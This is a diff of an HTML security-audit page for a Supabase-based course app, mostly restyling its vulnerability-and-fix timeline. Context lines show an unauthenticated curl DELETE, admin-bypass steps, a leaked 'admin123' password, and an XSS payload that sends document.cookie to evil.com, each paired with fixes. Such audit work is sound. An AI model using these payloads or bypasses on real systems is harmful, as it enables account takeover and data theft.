@@ -412,40 +412,40 @@
         .research-intro a:hover { text-decoration: underline; }
 
         /* TIMELINE */
-        .audit-timeline { position: relative; padding-left: 0; }
+        .audit-timeline {
+            position: relative;
+            padding-left: 2.5rem;
+        }
 
         .audit-timeline::before {
             content: '';
             position: absolute;
-            left: 50%;
+            left: 0.85rem;
             top: 0;
             bottom: 0;
             width: 2px;
             background: var(--border);
-            transform: translateX(-1px);
         }
 
         .tl-step {
             position: relative;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 2rem;
             margin-bottom: 1.5rem;
         }
 
         .tl-step::before {
             content: attr(data-step);
             position: absolute;
-            left: 50%;
-            top: 1.1rem;
+            left: -2.5rem;
+            top: 1rem;
             transform: translateX(-50%);
-            width: 30px;
-            height: 30px;
+            left: -1.6rem;
+            width: 28px;
+            height: 28px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             font-weight: 800;
             z-index: 2;
             color: #fff;
@@ -454,17 +454,20 @@
         .tl-step.tl-vuln::before { background: #dc2626; }
         .tl-step.tl-fix::before { background: #16a34a; }
 
-        .tl-vuln .tl-card { grid-column: 1; text-align: left; }
-        .tl-vuln .tl-spacer { grid-column: 2; }
-        .tl-fix .tl-spacer { grid-column: 1; }
-        .tl-fix .tl-card { grid-column: 2; text-align: left; }
-
         .tl-card {
             background: var(--card-bg);
             border: 1px solid var(--border);
             border-radius: 12px;
             padding: 1.25rem 1.5rem;
             box-shadow: var(--card-shadow);
+        }
+
+        .tl-fix .tl-card {
+            border-left: 3px solid #16a34a;
+        }
+
+        .tl-vuln .tl-card {
+            border-left: 3px solid #dc2626;
         }
 
         .tl-card h3 {
@@ -518,19 +521,20 @@
         }
 
         .code-block {
-            background: #1e293b;
+            background: #0a0e17;
             border-radius: 8px;
             padding: 0.85rem 1rem;
             margin-bottom: 0.6rem;
             overflow-x: auto;
             position: relative;
+            border: 1px solid #1a1f2e;
         }
 
         .code-block pre {
             font-family: "SF Mono", "Fira Code", "Cascadia Code", monospace;
             font-size: 0.78rem;
             line-height: 1.55;
-            color: #e2e8f0;
+            color: #c8d1dc;
             margin: 0;
             white-space: pre;
         }
@@ -542,9 +546,9 @@
             position: absolute;
             top: 0.5rem;
             right: 0.5rem;
-            background: rgba(255,255,255,0.08);
-            border: 1px solid rgba(255,255,255,0.15);
-            color: #94a3b8;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: #64748b;
             font-size: 0.65rem;
             padding: 0.25rem 0.5rem;
             border-radius: 4px;
@@ -553,7 +557,7 @@
             transition: all 0.15s;
         }
 
-        .copy-btn:hover { background: rgba(255,255,255,0.15); color: #e2e8f0; }
+        .copy-btn:hover { background: rgba(255,255,255,0.1); color: #94a3b8; }
 
         .tag-label { font-weight: 700; color: var(--fg); }
 
@@ -564,15 +568,9 @@
         }
 
         @media (max-width: 700px) {
-            .audit-timeline::before { left: 1rem; }
-            .tl-step {
-                grid-template-columns: 1fr;
-                padding-left: 2.5rem;
-            }
-            .tl-step::before { left: 1rem; }
-            .tl-vuln .tl-card,
-            .tl-fix .tl-card { grid-column: 1; }
-            .tl-spacer { display: none; }
+            .audit-timeline { padding-left: 2rem; }
+            .audit-timeline::before { left: 0.55rem; }
+            .tl-step::before { left: -1.35rem; width: 24px; height: 24px; font-size: 0.6rem; }
         }
 
         /* SCRAPING POC */
@@ -823,12 +821,10 @@
 };</pre></div>
                     <p>Even if RLS blocked the query, the fallback guarantees the password is always readable. It's shipped to every visitor.</p>
                 </div>
-                <div class="tl-spacer"></div>
             </div>
 
             <!-- FIX 1 -->
             <div class="tl-step tl-fix" data-step="&#10003;">
-                <div class="tl-spacer"></div>
                 <div class="tl-card">
                     <h3><span class="severity-badge severity-fix">FIX</span> Server-Side Auth with Hashed Passwords</h3>
                     <p>Remove all client-side password logic. Use Supabase Auth with email/password sign-in. Passwords are hashed server-side automatically:</p>
@@ -863,12 +859,10 @@ curl -X DELETE \
 <span class="hl"># 204 No Content — course deleted, zero auth</span></pre></div>
                     <p>Confirmed: SELECT (200), UPSERT (201), DELETE (204) all succeed on <code>admins</code>, <code>users</code>, <code>projects</code>, and the <code>cores-images</code> storage bucket.</p>
                 </div>
-                <div class="tl-spacer"></div>
             </div>
 
             <!-- FIX 2 -->
             <div class="tl-step tl-fix" data-step="&#10003;">
-                <div class="tl-spacer"></div>
                 <div class="tl-card">
                     <h3><span class="severity-badge severity-fix">FIX</span> Enable RLS on Every Table</h3>
                     <p>The anon key is meant to be public — but only when RLS restricts what it can reach. Add policies per table:</p>
@@ -909,12 +903,10 @@ const tryAdmin = () =&gt;
 const onAdmin = () =&gt; setScreen(<span class="hl">"admin"</span>);</pre></div>
                     <p>Three independent bypasses: (1) read <code>adminPw</code> from React state in DevTools, (2) call <code>setScreen("admin")</code> from console, (3) skip the UI — hit Supabase REST directly with the anon key.</p>
                 </div>
-                <div class="tl-spacer"></div>
             </div>
 
             <!-- FIX 3 -->
             <div class="tl-step tl-fix" data-step="&#10003;">
-                <div class="tl-spacer"></div>
                 <div class="tl-card">
                     <h3><span class="severity-badge severity-fix">FIX</span> JWT Sessions + Server-Side Gating</h3>
                     <p>Replace the state-based check with Supabase Auth sessions. The admin screen is gated on a valid JWT, and every API call is validated server-side via RLS:</p>
@@ -947,12 +939,10 @@ else setScreen("home");
 <span class="hl">// Injected payload (via admin panel or direct API):</span>
 // &lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;</pre></div>
                 </div>
-                <div class="tl-spacer"></div>
             </div>
 
             <!-- FIX 4 -->
             <div class="tl-step tl-fix" data-step="&#10003;">
-                <div class="tl-spacer"></div>
                 <div class="tl-card">
                     <h3><span class="severity-badge severity-fix">FIX</span> DOMPurify + Content Security Policy</h3>
                     <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl">// Sanitize before render</span>
@@ -978,12 +968,10 @@ import DOMPurify from 'dompurify';
 <span class="hl">-- id | password
 -- 1  | admin123</span></pre></div>
                 </div>
-                <div class="tl-spacer"></div>
             </div>
 
             <!-- FIX 5 -->
             <div class="tl-step tl-fix" data-step="&#10003;">
-                <div class="tl-spacer"></div>
                 <div class="tl-card">
                     <h3><span class="severity-badge severity-fix">FIX</span> Drop the admins Table Entirely</h3>
                     <p>With Supabase Auth handling credentials, the custom <code>admins</code> table is unnecessary:</p>
@@ -1003,12 +991,10 @@ WHERE email = 'admin@dataforest.com';</pre></div>
                     <h3><span class="severity-badge severity-medium">MEDIUM</span> No CSP + No Input Validation</h3>
                     <p>No <code>Content-Security-Policy</code> header. Learner names, media URLs, and quiz feedback accepted with no length limits, format checks, or encoding — widening the attack surface for XSS and injection.</p>
                 </div>
-                <div class="tl-spacer"></div>
             </div>
 
             <!-- FIX 6 -->
             <div class="tl-step tl-fix" data-step="&#10003;">
-                <div class="tl-spacer"></div>
                 <div class="tl-card">
                     <h3><span class="severity-badge severity-fix">FIX</span> Validate at Boundaries</h3>
                     <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl">// Validate learner name</span>
@@ -1061,12 +1047,10 @@ for p in data:
                         <br><span class="tag-label">Insufficient:</span> Anon key exists but paired with zero policies
                     </div>
                 </div>
-                <div class="tl-spacer"></div>
             </div>
 
             <!-- FIX 7 -->
             <div class="tl-step tl-fix" data-step="&#10003;">
-                <div class="tl-spacer"></div>
                 <div class="tl-card">
                     <h3><span class="severity-badge severity-fix">FIX</span> Defense in Depth Against Scraping</h3>
                     <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl">-- 1. RLS: only enrolled learners can read course data</span>
